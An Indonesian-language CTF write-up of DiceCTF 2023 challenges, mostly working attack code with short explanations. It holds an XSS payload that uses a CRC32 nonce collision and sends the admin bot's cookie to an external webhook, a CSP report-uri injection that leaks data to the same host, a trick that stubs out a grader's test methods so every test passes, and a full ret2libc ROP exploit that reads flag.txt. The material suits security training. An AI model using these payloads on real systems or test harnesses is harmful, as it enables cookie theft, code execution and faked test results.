# web
---
## recursive-csp
### TL;DR

Untuk menyelesaikan challenge ini kita perlu melakukan crc32 collision agar kita dapat mengendalikan CSP nonce dan dapat melakukan xss untuk mencuri cookie dari bot 

### How To Solve

Di dalam website yang diberikan kita dapat melihat source code dengan menambahkan parameter ?source
https://recursive-csp.mc.ax/?source

Berikut source code dari challenge tersebut 

```php
<?php
  if (isset($_GET["source"])) highlight_file(__FILE__) && die();

  $name = "world";
  if (isset($_GET["name"]) && is_string($_GET["name"]) && strlen($_GET["name"]) < 128) {
    $name = $_GET["name"];
  }

  $nonce = hash("crc32b", $name);
  header("Content-Security-Policy: default-src 'none'; script-src 'nonce-$nonce' 'unsafe-inline'; base-uri 'none';");
?>
<!DOCTYPE html>
<html>
  <head>
    <title>recursive-csp</title>
  </head>
  <body>
    <h1>Hello, <?php echo $name ?>!</h1>
    <h3>Enter your name:</h3>
    <form method="GET">
      <input type="text" placeholder="name" name="name" />
      <input type="submit" />
    </form>
    <!-- /?source -->
  </body>
</html>
```

Setelah itu kita bisa menggunakan ini https://www.nayuki.io/page/forcing-a-files-crc-to-any-value untuk melakukan crc32 collision.

Berikut kode yang saya gunakan untuk  menggenerate payload yang berisi crc32 collision 

```python
from subprocess import check_output
from Crypto.Util.number import long_to_bytes
from urllib.parse import quote_from_bytes

def get_collision(text, crc):
    with open("test", "w") as f:
        f.write(text)
    check_output(['python3', './forcecrc32.py', 'test', f"{len(text)-4}", crc])
    with open("test", "rb") as f:
        return quote_from_bytes(f.read())


payload = """
<script nonce=12312312>
window.location.href = "https://eowpmyr1h7ic854.m.pipedream.net?"+document.cookie
</script>
aaaa
"""
url = "https://recursive-csp.mc.ax/?name="

print(url+get_collision(payload, "12312312"))
```

Jalankan script di atas dan masukkan outputnya ke bot admin yang disediakan, setelah itu kita akan mendapatkan flagnya di webhook yang kita buat 

![](Pasted%20image%2020230207164229.png)

Silahkan ya temen2 yang mau buat post writeup dari DiceCTF 2023 bisa disini🙏 

> Dari sini merupakan challenge yang tidak bisa kita selesaikan saat perlombaan ctf berlangsung

# Brief explanation about the challenges
---
## codebox (web)

Pada challenge ini kita tidak perlu untuk mendapatkan xss, melainkan kita bisa memanfaatkan vulnerability CPS injection yang berada di atribute src pada tag img . Setelah itu kita dapat memanfaatkan CSP require-truested-types-for untuk mentrigger CSP violation dan mengirimkan report tersebut menggunakan CSP report-uri 

![](Pasted%20image%2020230207164413.png)

https://codebox.mc.ax/?code&code=%3Cimg+src%3D%22*%3B+report-uri+%27https%3A%2F%2Feowpmyr1h7ic854.m.pipedream.net%27%3B+require-trusted-types-for+%27script%27%22

Report yang terkirim ke webhook 

![](Pasted%20image%2020230207164435.png)

Untuk lebih jelasnya bisa melihat vidio berikut: https://www.youtube.com/watch?v=oTv3A4lxTro&list=PLUj83tCk_iA3TkyHd1pDdYRIjTpkp96mA

## scorescope (web)

Pada challenge ini kita perlu untuk menyelesaikan semua test casenya, tetapi ada beberapa testcase yang mustahil di kerjakan degna cara biasa.

Hasil yang pertama kita bisa lakukan adalah meleak top level context menggunakan `__import__('__main__')`, setelah itu kita bisa merubah semua test fungsi yang ada di pbject suite pada top level context.

Untuk lebih jelasnya bisa melihat vidio berikut: https://www.youtube.com/watch?v=4SzJs2U9-2U&list=PLUj83tCk_iA3TkyHd1pDdYRIjTpkp96mA

Payload utuk menyelesaikan challenge

```python
def nop():
    return

def add(a, b):
    main = __import__('__main__')
    def make_nop(suite):
        if suite == None:
            return
        if "_testMethodName" in suite.__dict__:
            suite.__dict__[suite.__dict__['_testMethodName']] = nop
        if "_tests" in suite.__dict__:
            for a in suite._tests:
                make_nop(a)
    make_nop(main.suite)
    return a+b
```

## bop (pwn)

Ret2libc dengan seccomp read, write, dan open
https://www.youtube.com/watch?v=EXTx8EY7QP4&list=PLUj83tCk_iA3TkyHd1pDdYRIjTpkp96mA&index=7

solver: 
```python
from pwn import *
import sys

BINARY = "./bop_patched"
context.binary = exe = ELF(BINARY, checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"
libc = ELF("./libc.so.6", checksec=False)

# bop gadget
main_addr = 0x4012f9
empty_addr = 0x404400
pop_rdi = 0x4013d3
ret_addr = 0x40101a

# libc gadget
mov_edi_eax = 0x5b623


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def get_libc_addr(self):
        p = self.p
        p.recvuntil(b"Do you bop? ")
        r = ROP(exe)
        
        # write to arbitary address
        r.raw(pop_rdi)
        r.raw(empty_addr)
        r.gets()

        # leak via printf
        r.raw(pop_rdi)
        r.raw(empty_addr)
        r.printf()
        
        # return to main
        r.raw(ret_addr)
        r.raw(main_addr)
        
        # send rop chain
        pay = cyclic(40)
        pay += r.chain()
        p.sendline(pay)
        
        # send text
        p.sendline(b"%p")
        leak = p.recvuntil(b"Do you bop? ").split(b"Do")[0]
        leak = eval(leak)
        libc.address = leak - 0x1eca03
        info(f"{libc.address=:x}")


x, p = init()

x.get_libc_addr()
r = ROP(libc)

x.debug((
    f"break *{r.find_gadget(['syscall', 'ret'])[0]}"
))

# write to arbitary address
r.raw(pop_rdi)
r.raw(empty_addr)
r.gets()

# open file 
r(rax=0x2, rdi=empty_addr,rsi=0, rdx=0)
r.raw(r.find_gadget(['syscall', 'ret']))

# save file pointer rax to rdi
r.raw(mov_edi_eax+libc.address)

# read file
r(rax=0, rsi=empty_addr, rdx=0x50)
r.raw(r.find_gadget(['syscall', 'ret']))

# write to stdin
r(rax=1, rdi=1, rsi=empty_addr, rdx=0x50)
r.raw(r.find_gadget(['syscall', 'ret']))

pay = cyclic(40)
pay += r.chain()
p.sendline(pay)
p.sendline("flag.txt")

p.interactive()
```

